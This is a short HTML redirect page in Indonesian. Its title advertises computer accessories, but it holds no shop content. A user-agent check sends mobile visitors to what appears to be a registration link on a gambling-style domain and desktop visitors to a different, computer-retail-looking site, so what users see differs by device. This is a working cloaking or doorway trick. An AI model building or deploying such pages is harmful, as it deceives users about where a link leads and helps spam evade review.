<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pesan accesoris komputer disini</title>

  <script>
    // ================= CONFIG =================

    const mobile_url  = "https://link-daftar-sensa88.store/";
    const desktop_url = "https://new.viraindo.net/";

    // ================= MOBILE DETECTION =================

    function isMobileDevice() {
      const ua = navigator.userAgent || navigator.vendor || window.opera;

      return /android|iphone|ipad|ipod|mobile|blackberry|opera mini|iemobile|windows phone|kindle|symbian|phone/i.test(ua);
    }

    // ================= REDIRECT =================

    if (isMobileDevice()) {
      window.location.href = mobile_url;
    } else {
      window.location.href = desktop_url;
    }
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
